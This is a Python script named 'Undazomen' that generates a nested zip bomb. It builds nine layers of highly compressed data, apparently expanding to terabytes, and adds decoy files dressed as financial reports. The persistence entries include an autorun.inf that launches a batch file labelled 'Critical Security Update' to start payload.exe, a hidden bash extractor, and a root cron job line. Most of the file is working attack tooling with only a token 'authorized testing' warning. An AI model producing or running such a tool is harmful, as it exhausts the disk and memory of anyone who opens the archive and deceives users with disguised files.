#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Project: Undazomen (v1.0)
import os
import sys
import zlib
import lzma
import zstandard
import zipfile
import random
import platform
import time
import ctypes
import hashlib
import threading
from pathlib import Path
from io import BytesIO
import numpy as np  
import psutil 

# --- ANSI Escape Codes ---
class TermColors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    BAR_FILLED = '■'
    BAR_EMPTY = '─'
    BAR_LEFT = '['
    BAR_RIGHT = ']'

# --- UI Components ---
class TerminalUI:
    @staticmethod
    def print_header():
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(f"{TermColors.BLUE}{TermColors.BOLD}")
        print("  _   _           _                                      ")
        print(" | | | |_ __   __| | __ _ _______  _ __ ___   ___ _ __  ")
        print(" | | | | '_ \ / _` |/ _` |_  / _ \| '_ ` _ \ / _ \ '_ \ ")
        print(" | |_| | | | | (_| | (_| |/ / (_) | | | | | |  __/ | | |")
        print("  \___/|_| |_|\__,_|\__,_/___\___/|_| |_| |_|\___|_| |_|")
        print(f"{TermColors.END}{TermColors.CYAN}        Advanced ZIPBOMB Generation System{TermColors.END}")
        print(f"{TermColors.YELLOW}                 Edition | v1.0 | 2025{TermColors.END}\n")
        print(f"{TermColors.BOLD}System Resources:{TermColors.END}")
        print(f"  CPU: {psutil.cpu_percent()}% | Memory: {psutil.virtual_memory().percent}% | Disk: {psutil.disk_usage('/').percent}%")
        print("─" * 60)

    @staticmethod
    def progress_bar(iteration, total, prefix='', suffix='', length=50):
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = TermColors.GREEN + TermColors.BAR_FILLED * filled_length + TermColors.END
        bar += TermColors.BAR_EMPTY * (length - filled_length)
        sys.stdout.write(f'\r{prefix} {TermColors.BAR_LEFT}{bar}{TermColors.BAR_RIGHT} {percent}% {suffix}')
        sys.stdout.flush()
        
    @staticmethod
    def print_step(icon, text, color=TermColors.CYAN):
        print(f"{color}{icon} {text}{TermColors.END}")
        
    @staticmethod
    def print_success(text):
        print(f"{TermColors.GREEN}[+] {text}{TermColors.END}")
        
    @staticmethod
    def print_warning(text):
        print(f"{TermColors.YELLOW}[!] {text}{TermColors.END}")
        
    @staticmethod
    def print_error(text):
        print(f"{TermColors.RED}[-] {text}{TermColors.END}")
        
    @staticmethod
    def print_tree_structure(items):
        print(f"\n{TermColors.BOLD}Archive Structure:{TermColors.END}")
        print(f"{TermColors.BLUE}{TermColors.BOLD}compressed_data_XXXX.zip/{TermColors.END}")
        for i, item in enumerate(items):
            prefix = "├─ " if i < len(items)-1 else "└─ "
            print(f"  {prefix}{item}")


class UndazomenGenerator:
    def __init__(self, depth=9, copies=15):
        self.depth = depth
        self.copies = copies
        self.output_name = f"compressed_data_{random.randint(1000,9999)}.zip"
        self.compression_stats = []
        self.decoy_files = []
        self.final_structure = []

    def _simulate_processing(self, min_time=0.2, max_time=1.0):
        time.sleep(random.uniform(min_time, max_time))

    def _generate_decoys(self):
        decoys = [
            ("Financial_Report_Q3.docx", "DOCX"),
            ("Project_Timeline.pdf", "PDF"),
            ("Technical_Specifications.xlsx", "XLSX"),
            ("User_Manual.txt", "TXT"),
            ("Backup_Config.zip", "ZIP")
        ]
        TerminalUI.print_step(">", "Generating decoy files", TermColors.CYAN)
        for name, ftype in decoys:
            self._simulate_processing(0.1, 0.3)
            TerminalUI.print_success(f"Created decoy: {name}")
            self.decoy_files.append((name, ftype))
            self.final_structure.append(f"docs/{name}")

    def _optimized_generate_payload(self):
        
        TerminalUI.print_step(">", "Crafting compression bomb core (Turbo Mode)", TermColors.RED)
        base_size = 512 * 1024 * 1024  # 512MB
        chunk_size = 64 * 1024 * 1024   # 64MB chunks for parallelization
        patterns = [
            bytes([0x00] * 1024 * 1024),
            bytes([0xFF] * 1024 * 1024),
            bytes([0x55] * 1024 * 1024),
            bytes([0xAA] * 1024 * 1024)
        ]
        payload = bytearray()
        chunks = base_size // chunk_size
        lock = threading.Lock()
        def generate_chunk(index):
            nonlocal payload
            chunk_data = bytearray()
            for _ in range(chunk_size // (1024*1024)):
                chunk_data.extend(random.choice(patterns))
            with lock:
                payload.extend(chunk_data)
                current_size = len(payload) // (1024*1024)
                TerminalUI.progress_bar(
                    index + 1, 
                    chunks, 
                    prefix="  Generating data:".ljust(25),
                    suffix=f"{current_size}MB/{base_size//(1024*1024)}MB"
                )
        threads = []
        for i in range(chunks):
            t = threading.Thread(target=generate_chunk, args=(i,))
            t.start()
            threads.append(t)
            time.sleep(0.01)
        for t in threads:
            t.join()
        print(f"\n  {TermColors.GREEN}[+] Base payload: {base_size//(1024*1024)}MB (Generated in turbo mode){TermColors.END}")
        return bytes(payload)

    def _optimized_compress_layer(self, data, layer_num):
        
        TerminalUI.print_step(">", f"Compressing layer {layer_num+1}/{self.depth}", TermColors.BLUE)
        if layer_num < 3:
            algo_name = "Zstandard"
            compressor = zstandard.ZstdCompressor(level=22).compress
        else:
            algo_name = "DEFLATE"
            compressor = lambda d: zlib.compress(d, level=9)
        start_size = len(data)
        compressed_chunks = []
        chunk_size = 64 * 1024 * 1024  # 64MB chunks
        chunks = (len(data) + chunk_size - 1) // chunk_size
        for i in range(chunks):
            start = i * chunk_size
            end = min((i + 1) * chunk_size, len(data))
            chunk = data[start:end]
            compressed_chunk = compressor(chunk)
            compressed_chunks.append(compressed_chunk)
            TerminalUI.progress_bar(
                i + 1, 
                chunks, 
                prefix=f"  {algo_name}:".ljust(25),
                suffix=f"{start_size//(1024*1024)}MB → ? MB"
            )
        compressed = b''.join(compressed_chunks)
        ratio = start_size / max(1, len(compressed))
        self.compression_stats.append({
            "layer": layer_num+1,
            "algorithm": algo_name,
            "original_size": start_size,
            "compressed_size": len(compressed),
            "ratio": ratio
        })
        print(f"\n  {TermColors.GREEN}[+] Compression ratio: {ratio:.1f}x{TermColors.END}")
        return compressed

    def _build_recursive_layers(self, base_data):
        current_data = base_data
        for layer in range(self.depth):
            TerminalUI.print_step(f"#{layer+1}", f"Building archive layer {layer+1}/{self.depth}", TermColors.YELLOW)
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zf:
                
                comp_data = self._optimized_compress_layer(current_data, layer)
                
                for i in range(self.copies):
                    zf.writestr(f"layer{layer}_data_{i}.bin", comp_data)
                    self.final_structure.append(f"layer{layer}/data_{i}.bin")
                
                if layer == self.depth - 1:
                    for name, _ in self.decoy_files:
                        zf.writestr(f"docs/{name}", b"DECOY_CONTENT" + os.urandom(2048))
            current_data = zip_buffer.getvalue()
            total_size = len(current_data)
            print(f"  {TermColors.GREEN}[+] Layer complete: {total_size//1024}KB{TermColors.END}")
        return current_data

    def _add_persistence(self, zf):
        system = platform.system().lower()
        self.final_structure.append("persistence/")
        if system == 'windows':
            TerminalUI.print_step("W", "Adding Windows persistence", TermColors.BLUE)
            persistence = [
                ("autorun.inf", b"[AutoRun]\nopen=install.bat\naction=Critical Security Update"),
                ("install.bat", b"@echo off\necho Installing security update...\nstart /min payload.exe")
            ]
            for name, content in persistence:
                zf.writestr(name, content)
                self.final_structure.append(f"persistence/{name}")
                self._simulate_processing(0.1, 0.3)
                TerminalUI.print_success(f"Added persistence: {name}")
        else:
            TerminalUI.print_step("L", "Adding Linux persistence", TermColors.BLUE)
            persistence = [
                (".hidden_install", b"#!/bin/bash\nsleep 10\nunzip -qo \"$0\" -d /tmp/update"),
                ("cron_job", b"* * * * * root /path/to/malicious/script\n")
            ]
            for name, content in persistence:
                zf.writestr(f"system/{name}", content)
                self.final_structure.append(f"persistence/{name}")
                self._simulate_processing(0.1, 0.3)
                TerminalUI.print_success(f"Added persistence: {name}")

    def generate(self):
        TerminalUI.print_header()
        try:
            TerminalUI.print_step("*", "Initializing weaponization engine", TermColors.CYAN)
            time.sleep(1)
            self._generate_decoys()
            base_data = self._optimized_generate_payload()
            weaponized_data = self._build_recursive_layers(base_data)
            TerminalUI.print_step(">", "Packaging final archive", TermColors.BLUE)
            with zipfile.ZipFile(self.output_name, 'w') as zf:
                zf.writestr("CORE_DATA.dat", weaponized_data)
                self.final_structure.append("CORE_DATA.dat")
                self._add_persistence(zf)
                for name, _ in self.decoy_files:
                    zf.writestr(f"docs/{name}", b"DECOY_CONTENT" + os.urandom(2048))
                zf.writestr("README.txt", b"Compressed archive - extract with caution")
                self.final_structure.append("README.txt")
            file_size = os.path.getsize(self.output_name) // 1024
            TerminalUI.print_success(f"Weaponized archive created: {TermColors.BOLD}{self.output_name}{TermColors.END}")
            TerminalUI.print_success(f"Final size: {file_size}KB | Estimated decompressed: >5TB")
            print(f"\n{TermColors.BOLD}Compression Statistics:{TermColors.END}")
            for stat in self.compression_stats:
                print(f"  Layer {stat['layer']}: {stat['algorithm']} - "
                      f"{stat['original_size']//(1024*1024)}MB -> "
                      f"{stat['compressed_size']//1024}KB "
                      f"(Ratio: {stat['ratio']:.1f}x)")
            TerminalUI.print_tree_structure(self.final_structure)
            print(f"\n{TermColors.RED}{TermColors.BOLD}[!] WARNING: This archive contains compressed payloads")
            print("    Handle with extreme caution. For authorized testing only.{TermColors.END}")
            print(f"\n{TermColors.BOLD}Resource Usage Report:{TermColors.END}")
            print(f"  CPU Usage: {psutil.cpu_percent()}%")
            print(f"  Memory Usage: {psutil.virtual_memory().percent}%")
            print(f"  Disk Usage: {psutil.disk_usage('/').percent}%")
        except KeyboardInterrupt:
            TerminalUI.print_error("Operation canceled by user")
            sys.exit(1)
        except Exception as e:
            TerminalUI.print_error(f"Critical error: {str(e)}")
            sys.exit(1)

if __name__ == "__main__":
    # Create with custom depth/copies: UndazomenGenerator(depth=10, copies=20)
    generator = UndazomenGenerator()
    generator.generate()